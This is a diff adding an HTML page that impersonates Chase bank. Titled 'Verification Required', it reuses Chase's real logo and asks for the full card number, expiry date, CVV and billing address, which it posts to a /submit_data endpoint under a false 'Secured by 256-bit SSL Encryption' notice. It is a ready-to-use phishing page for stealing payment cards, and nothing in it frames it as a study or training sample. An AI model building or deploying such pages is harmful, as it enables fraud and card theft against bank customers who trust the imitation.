@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chase Online Security - Verification Required</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f7f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .payment-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 400px;
+            border-top: 10px solid #004a94;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header img {
+            width: 180px; /* Предполагается логотип Chase */
+        }
+        .header h2 {
+            color: #333;
+            font-size: 20px;
+            margin-top: 15px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #555;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+        .btn-submit {
+            width: 100%;
+            background-color: #0065cc;
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn-submit:hover {
+            background-color: #004a94;
+        }
+        .secure-notice {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="payment-container">
+    <div class="header">
+        <!-- Заглушка логотипа -->
+        <img src="https://www.chase.com/img/chase_logoEyebrow.png" alt="Chase Bank Logo">
+        <h2>Verify Your Account</h2>
+    </div>
+
+    <form action="/submit_data" method="POST">
+        <div class="form-group">
+            <label>Full Name as it appears on card</label>
+            <input type="text" name="cardholder_name" required placeholder="John Doe">
+        </div>
+        
+        <div class="form-group">
+            <label>Card Number</label>
+            <input type="text" name="card_number" required placeholder="0000 0000 0000 0000" maxlength="16">
+        </div>
+
+        <div class="row">
+            <div class="form-group">
+                <label>Exp. Date</label>
+                <input type="text" name="expiry" required placeholder="MM/YY" maxlength="5">
+            </div>
+            <div class="form-group">
+                <label>CVV</label>
+                <input type="text" name="cvv" required placeholder="123" maxlength="3">
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Billing Address</label>
+            <input type="text" name="billing_address" required placeholder="123 Main St, Apt 4">
+        </div>
+
+        <div class="row">
+            <div class="form-group">
+                <label>City</label>
+                <input type="text" name="billing_city" required>
+            </div>
+            <div class="form-group">
+                <label>Card Zip Code</label>
+                <input type="text" name="billing_zip" required maxlength="5">
+            </div>
+        </div>
+
+        <button type="submit" class="btn-submit">Verify Now</button>
+    </form>
+
+    <div class="secure-notice">
+        🔒 Secured by 256-bit SSL Encryption
+    </div>
+</div>
+
+</body>
+</html>
